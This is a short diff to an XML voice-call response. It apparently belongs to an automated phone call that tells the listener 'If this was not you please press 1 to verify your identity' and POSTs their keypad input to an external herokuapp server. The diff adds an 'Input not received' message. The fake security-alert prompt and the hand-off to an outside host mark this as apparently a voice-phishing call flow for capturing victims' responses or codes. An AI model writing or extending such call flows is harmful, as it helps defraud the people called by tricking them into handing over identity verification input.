@@ -3,4 +3,5 @@
 <GetInput action="https://servertestbyxblackxcoder.herokuapp.com/test.php" method="POST" inputType="dtmf" digitEndTimeout="5" language="en-US" redirect="true">
   <Speak language="en-US">If this was not you please press 1 to verify your identity</Speak>
 </GetInput>
+  <Speak>Input not received.</Speak>
 </Response>
